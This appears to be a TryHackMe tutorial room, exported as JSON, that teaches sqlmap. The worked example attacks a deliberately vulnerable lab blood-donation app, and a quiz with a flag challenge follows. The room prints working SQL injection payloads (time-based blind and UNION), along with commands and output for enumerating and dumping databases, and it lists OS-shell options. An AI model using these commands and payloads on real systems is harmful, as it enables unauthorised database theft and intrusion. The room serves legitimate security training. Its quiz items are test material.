{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/523723e4d3b75b6439b8e2cd0fa6880b.png', 'title': 'SQLMAP', 'description': 'Learn about and use Sqlmap to exploit the web application', 'code': 'sqlmap', 'users': 11222, 'tags': ['security', 'sqlmap', ' sql injection', 'tools', ' web app', 'sqli'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 578, 'created': '2021-05-13T12:24:04.600Z', 'published': '2022-01-20T19:00:00.228Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://i.imgur.com/2O70ow2.png', 'creator': 'nareshlamgade', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p style="text-align:center"><img src="https://sqlmap.org/images/screenshot.png" /><br /></p><p style="text-align:center"><span style="font-size:1rem;text-align:left">In this room, we will learn about sqlmap and how it can be used to exploit SQL Injection vulnerabilities.</span></p><p style="text-align:left"><b><span style="font-size:24px">What is sqlmap?</span></b>\xa0</p><p>sqlmap is an open source penetration testing tool developed by\xa0Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar t<span style="font-size:1rem">hat automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</span></p><h3><span style="font-size:24px"><b>Installing Sqlmap</b></span></h3><p>If you\'re using Kali Linux, sqlmap is pre-installed. Otherwise, you can download it here:\xa0<a href="https://github.com/sqlmapproject/sqlmap" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id--54413412">https://github.com/sqlmapproject/sqlmap</span></a><br /></p>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2021-05-13T12:26:41.732Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the above and have sqlmap at the ready.', 'hint': ''}]}, {'taskTitle': 'Using Sqlmap', 'taskDesc': '<h3><span style="font-size:1.75rem">Sqlmap Commands</span></h3><h3><span style="font-size:1rem">To show the basic help menu, simply type </span><code>sqlmap -h</code><span style="font-size:1rem">\xa0</span><span style="font-size:1rem">in the terminal.</span></h3>\n<div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Help Message</div>\n        <pre class="terminal-code">           <code class="language-shell-session">nare@nare$ sqlmap -h\n        ___\n       __H__\n ___ ___[\']_____ ___ ___  {1.6#stable}\n|_ -| . [(]     | .\'| . |\n|___|_  [\']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\nUsage: python3 sqlmap [options]\n\nOptions:\n  -h, --help            Show basic help message and exit\n  -hh                   Show advanced help message and exit\n  --version             Show program\'s version number and exit\n  -v VERBOSE            Verbosity level: 0-6 (default 1)\n\n  Target:\n    At least one of these options has to be provided to define the\n    target(s)\n\n    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")\n    -g GOOGLEDORK       Process Google dork results as target URLs\n\n  Request:\n    These options can be used to specify how to connect to the target URL\n\n    --data=DATA         Data string to be sent through POST (e.g. "id=1")\n    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")\n    --random-agent      Use randomly selected HTTP User-Agent header value\n    --proxy=PROXY       Use a proxy to connect to the target URL\n    --tor               Use Tor anonymity network\n    --check-tor         Check to see if Tor is used properly\n\n  Injection:\n    These options can be used to specify which parameters to test for,\n    provide custom injection payloads and optional tampering scripts\n\n    -p TESTPARAMETER    Testable parameter(s)\n    --dbms=DBMS         Force back-end DBMS to provided value\n\n  Detection:\n    These options can be used to customize the detection phase\n\n    --level=LEVEL       Level of tests to perform (1-5, default 1)\n    --risk=RISK         Risk of tests to perform (1-3, default 1)\n\n  Techniques:\n    These options can be used to tweak testing of specific SQL injection\n    techniques\n\n    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")\n\n  Enumeration:\n    These options can be used to enumerate the back-end database\n    management system information, structure and data contained in the\n    tables\n\n    -a, --all           Retrieve everything\n    -b, --banner        Retrieve DBMS banner\n    --current-user      Retrieve DBMS current user\n    --current-db        Retrieve DBMS current database\n    --passwords         Enumerate DBMS users password hashes\n    --tables            Enumerate DBMS database tables\n    --columns           Enumerate DBMS database table columns\n    --schema            Enumerate DBMS schema\n    --dump              Dump DBMS database table entries\n    --dump-all          Dump all DBMS databases tables entries\n    -D DB               DBMS database to enumerate\n    -T TBL              DBMS database table(s) to enumerate\n    -C COL              DBMS database table column(s) to enumerate\n\n  Operating system access:\n    These options can be used to access the back-end database management\n    system underlying operating system\n\n    --os-shell          Prompt for an interactive operating system shell\n    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC\n\n  General:\n    These options can be used to set some general working parameters\n\n    --batch             Never ask for user input, use the default behavior\n    --flush-session     Flush session files for current target\n\n  Miscellaneous:\n    These options do not fit into any other category\n\n    --wizard            Simple wizard interface for beginner users\n\n[!] to see full list of options run with \'-hh\'\n</code>\n        </pre></div></div><h3><span style="font-size:1rem"><b>Basic</b>\xa0commands:</span><br /></h3><table class="table table-bordered"><tbody><tr><td><b>Options</b></td><td><b>Description</b></td></tr><tr><td>-u URL, --url=URL</td><td>Target URL (e.g. "http://www.site.com/vuln.php?id=1")<br /></td></tr><tr><td>--data=DATA<br /></td><td>Data string to be sent through POST (e.g. "id=1")<br /></td></tr><tr><td>--random-agent<br /></td><td>Use randomly selected HTTP User-Agent header value<br /></td></tr><tr><td>-p TESTPARAMETER<br /></td><td>Testable parameter(s)<br /></td></tr><tr><td>--level=LEVEL<br /></td><td>Level of tests to perform (1-5, default 1)<br /></td></tr><tr><td>--risk=RISK<br /></td><td>Risk of tests to perform (1-3, default 1)<br /></td></tr></tbody></table><h3><span style="font-size:1rem"><b>Enumeration </b>commands:</span></h3><h3><span style="font-size:1rem"><i>These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.</i></span></h3><table class="table table-bordered"><tbody><tr><td><span style="font-weight:bolder">Options</span><br /></td><td><span style="font-weight:bolder">Description</span><br /></td></tr><tr><td>-a, --all</td><td>Retrieve everything<br /></td></tr><tr><td>-b, --banner</td><td>Retrieve DBMS banner<br /></td></tr><tr><td>--current-user<br /></td><td>Retrieve DBMS current user</td></tr><tr><td>--current-db<br /></td><td>Retrieve DBMS current database<br /></td></tr><tr><td>--passwords<br /></td><td>Enumerate DBMS users password hashes<br /></td></tr><tr><td>\xa0 \xa0 \xa0 \xa0 \xa0 --dbs\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0<br /></td><td>\xa0\xa0Enumerate DBMS databases<br /></td></tr><tr><td>--tables<br /></td><td>Enumerate DBMS database tables<br /></td></tr><tr><td>--columns<br /></td><td>Enumerate DBMS database table columns<br /></td></tr><tr><td>--schema<br /></td><td>Enumerate DBMS schema<br /></td></tr><tr><td>--dump<br /></td><td>Dump DBMS database table entries<br /></td></tr><tr><td>--dump-all<br /></td><td>Dump all DBMS databases tables entries<br /></td></tr><tr><td>--is-dba\xa0 \xa0 \xa0 \xa0 \xa0 \xa0<br /></td><td>\xa0Detect if the DBMS current user is DBA<br /></td></tr><tr><td>-D &lt;DB NAME&gt;<br /></td><td>DBMS database to enumerate<br /></td></tr><tr><td>-T &lt;TABLE NAME&gt;<br /></td><td>DBMS database table(s) to enumerate<br /></td></tr><tr><td>-C COL<br /></td><td>DBMS database table column(s) to enumerate<br /></td></tr></tbody></table><h3><span style="font-size:1rem"><span style="font-weight:bolder">Operating System access\xa0</span>commands</span></h3><h3><span style="font-size:1rem"> </span></h3><h3><span style="font-size:16px"><i>These options can be used to access the back-end database management system on the target operating system.</i></span></h3><table class="table table-bordered"><tbody><tr><td><span style="font-weight:700">Options</span><br /></td><td><span style="font-weight:700">Description</span><br /></td></tr><tr><td>--os-shell</td><td>Prompt for an interactive operating system shell<br /></td></tr><tr><td>--os-pwn</td><td>Prompt for an OOB shell, Meterpreter or VNC<br /></td></tr><tr><td>--os-cmd=OSCMD<br /></td><td>Execute an operating system command<br /></td></tr><tr><td>--priv-esc<br /></td><td>Database process user privilege escalation<br /></td></tr><tr><td>--os-smbrelay<br /></td><td>One-click prompt for an OOB shell, Meterpreter or VNC<br /></td></tr></tbody></table><h3><br /></h3><p><i>Note that the tables shown above aren\'t all the possible switches to use with sqlmap. For a more extensive list of options, run <code>sqlmap -hh</code> to display the advanced help message. </i></p><p>Now that we\'ve seen some of the options we can use with sqlmap, let’s jump into the examples using both GET and POST Method based requests.</p><p><br /><b>Simple HTTP GET Based Test</b><br /><br /><code>sqlmap -u https://testsite.com/page.php?id=7 --dbs</code><br /></p><p>Here we have used two flags:\xa0<span style="font-weight:600" class="notion-enable-hover">-u\xa0</span>to state the vulnerable URL and <span style="font-weight:600" class="notion-enable-hover">--dbs</span>\xa0to enumerate the database.</p><p><br /><b>Simple HTTP POST Based Test</b><br /></p><p>First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select \'Copy to file\', and save it to a directory. You could also copy the  whole request and save it to a text file as well.<br /></p><p><img style="width:738px" src="https://i.imgur.com/xRFhXVn.png" /><br /></p><p><span style="font-size:1rem">You’ll notice in the request above, we have a POST parameter \'</span><span class="notion-enable-hover" style="font-size:1rem;font-style:italic">blood_group</span><span style="font-size:1rem">\' which could a vulnerable parameter.</span></p><p>\n\n</p><div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Saved HTTP POST request\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">nare@nare$ cat req.txt\nPOST /blood/nl-search.php HTTP/1.1\nHost: 10.10.17.116\nContent-Length: 16\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.17.116\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://10.10.17.116/blood/nl-search.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4\nConnection: close\n\nblood_group=B%2B</code>\n        </pre>\n    </div>\n</div>\n\n<br /><br />Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:<br /><br /><code>sqlmap -r req.txt -p blood_group --dbs</code><br /><p></p><p><span style="font-size:1rem"></span></p><p><code><b>sqlmap -r &lt;request_file&gt;\xa0-p &lt;vulnerable_parameter&gt;\xa0--dbs</b></code></p><div><br /></div><p><span style="font-size:1rem">Here we have used two flags:\xa0</span><span class="notion-enable-hover" style="font-size:1rem;font-weight:600">-r</span><span style="font-size:1rem"> to read the file,\xa0</span><span class="notion-enable-hover" style="font-size:1rem;font-weight:600">-p</span><span style="font-size:1rem">\xa0to supply the vulnerable parameter, and\xa0</span><span class="notion-enable-hover" style="font-size:1rem;font-weight:600">--dbs\xa0</span><span style="font-size:1rem">to enumerate the database.</span></p><div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Database Enumeration\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">nare@nare$ sqlmap -r req.txt -p blood_group --dbs\n[19:31:39] [INFO] testing \'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\'\n[19:31:50] [INFO] POST parameter \'blood_group\' appears to be \'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\' injectable\nit looks like the back-end DBMS is \'MySQL\'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n\nfor the remaining tests, do you want to include all tests for \'MySQL\' extending provided level (1) and risk (1) values? [Y/n] Y\n[19:33:09] [INFO] testing \'Generic UNION query (NULL) - 1 to 20 columns\'\n[19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)\n[19:33:09] [WARNING] most likely web server instance hasn\'t recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag \'T\' in option \'--technique\' (e.g. \'--flush-session --technique=BEUS\') or try to lower the value of option \'--time-sec\' (e.g. \'--time-sec=2\')\n[19:33:10] [WARNING] reflective value(s) found and filtering out\n[19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns\n[19:33:13] [INFO] POST parameter \'blood_group\' is \'Generic UNION query (NULL) - 1 to 20 columns\' injectable\nPOST parameter \'blood_group\' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:\n---\nParameter: blood_group (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: blood_group=B+\' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND \'gXEj\'=\'gXEj\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 8 columns\n    Payload: blood_group=B+\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -\n---\n[19:33:16] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.10.3\nback-end DBMS: MySQL &gt;= 5.0.12\n[19:33:17] [INFO] fetching database names\navailable databases [6]:\n[*] blood\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys\n[*] test</code>\n        </pre></div></div><br />Now that we have the databases, let\'s extract tables from the database <b>blood</b>.<p></p><p><b>Using GET based Method</b><br /><br /><code>sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables</code></p><p><b><code>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt;\xa0--tables</code><span style="color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;background-color:rgb(234, 234, 237)"></span><br /></b><br /><b>Using POST based Method</b></p><p><code>sqlmap -r req.txt -p blood_group -D blood --tables</code></p><p><b><code>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; --tables</code><br /></b></p><p><span style="font-size:1rem">Once we run these commands, we should get the tables.</span></p><div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Getting Tables\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables\n[19:35:57] [INFO] parsing HTTP request from \'req.txt\'\n[19:35:57] [INFO] resuming back-end DBMS \'mysql\'\n[19:35:57] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: blood_group (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: blood_group=B+\' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND \'gXEj\'=\'gXEj\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 8 columns\n    Payload: blood_group=B+\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -\n---\n[19:35:58] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.10.3\nback-end DBMS: MySQL &gt;= 5.0.12\n[19:35:58] [INFO] fetching tables for database: \'blood\'\n[19:35:58] [WARNING] reflective value(s) found and filtering out\nDatabase: blood\n[3 tables]\n+----------+\n| blood_db |\n| flag     |\n| users    |\n+----------+</code>\n        </pre>\n    </div>\n</div>\n<br /><br /><p></p><p>Once we have available tables, now let’s gather the columns from the table\xa0<span style="font-weight:600" class="notion-enable-hover">blood_db</span>.<br /><br /><b>Using GET based Method</b></p><p><code>sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns</code></p><p><b><code>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</code><br /></b><br /><br /><b>Using POST based Method</b></p><p><code>sqlmap -r req.txt -D blood -T blood_db --columns</code></p><p><b><code>sqlmap -r req.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</code><br /></b><br /></p><div class="terminal-container">\n    <div class="terminal-content">\n        <div class="terminal-top">\n            Getting Tables\n        </div>\n        <pre class="terminal-code">           <code class="language-shell-session">nare@nare$ sqlmap -r req.txt -D blood -T blood_db --columns\n[19:35:57] [INFO] parsing HTTP request from \'req.txt\'\n[19:35:57] [INFO] resuming back-end DBMS \'mysql\'\n[19:35:57] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: blood_group (POST)\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: blood_group=B+\' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND \'gXEj\'=\'gXEj\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 8 columns\n    Payload: blood_group=B+\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -\n---\n[19:35:58] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.10.3\nback-end DBMS: MySQL &gt;= 5.0.12\n[19:35:58] [INFO] fetching tables for database: \'blood\'\n[19:35:58] [WARNING] reflective value(s) found and filtering out\nDatabase: blood\n[3 tables]\n+----------+\n| blood_db |\n| flag     |\n| users    |\n+----------+</code>\n        </pre>\n    </div>\n</div><p></p><p><br />Or we can simply dump all the available databases and tables using the following commands.<br /></p><p><br /><b>Using GET based Method</b></p><p><code>sqlmap -u https://testsite.com/page.php?id=7 -D  &lt;database_name&gt; --dump-all</code><br /><br /><code>sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all</code><br /></p><p><br /><b>Using POST based Method</b></p><p><code>sqlmap -r req.txt -D &lt;database_name&gt;  --dump-all</code><br /><br /><code>sqlmap -r req.txt-p\xa0 -D &lt;database_name&gt; --dump-all</code><br /></p><h4><br /></h4><p><span style="font-size:1rem">I hope you have enjoyed seeing the basics of using sqlmap and its various commands. Now, let’s start the challenge in the next task!</span><span style="font-family:&quot;ubuntu mono&quot;;font-size:1rem">\ufeff</span><br /></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-05-14T11:17:57.549Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which flag or option will allow you to add a URL to the command?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Which flag would you use to add data to a POST request?</p>', 'hint': ''}, {'questionNo': 3, 'question': 'There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?', 'hint': ''}, {'questionNo': 4, 'question': '<p>Which flag would you use to show the advanced help menu?</p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Which flag allows you to retrieve everything?</p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>Which flag allows you to select the database name?</p>', 'hint': ''}, {'questionNo': 7, 'question': '<p>Which flag would you use to retrieve database tables?</p>', 'hint': ''}, {'questionNo': 8, 'question': '<p>Which flag allows you to retrieve a table’s columns?<br /></p>', 'hint': ''}, {'questionNo': 9, 'question': '<p>Which flag allows you to dump all the database table entries?</p>', 'hint': ''}, {'questionNo': 10, 'question': '<p>Which flag will give you an interactive SQL Shell prompt?</p>', 'hint': 'Use advance help'}, {'questionNo': 11, 'question': "<p>You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?</p>", 'hint': 'All lowercase'}]}, {'taskTitle': 'SQLMap Challenge', 'taskDesc': '<p><span style="text-align:center">Deploy the machine attached to this task, then navigate to\xa0</span><code>MACHINE_IP</code><span style="text-align:center">\xa0</span><i>(this machine can take up to 3 minutes to boot)</i></p><p><b><span style="font-size:18px">Task:\xa0</span></b></p><p><span style="font-size:1rem">We have deployed an application to collect \'</span><span class="notion-enable-hover" style="font-size:1rem;font-style:italic;font-weight:600">Blood Donations</span><span style="font-size:1rem">\'. The request seems to be vulnerable.</span></p><p>Exploit a SQL Injection vulnerability on the vulnerable application to find the flag.<br /></p>', 'taskType': 'vm', 'taskNo': 3, 'taskCreated': '2021-05-14T11:57:39.172Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '609e62cf49706f00551402a3', 'questions': [{'questionNo': 1, 'question': '<p>What is the name of the interesting directory ?</p>', 'hint': 'use gobuster '}, {'questionNo': 2, 'question': '<p>Who is the current db user?\xa0</p>', 'hint': ''}, {'questionNo': 3, 'question': 'What is the final flag?\xa0', 'hint': ''}]}]}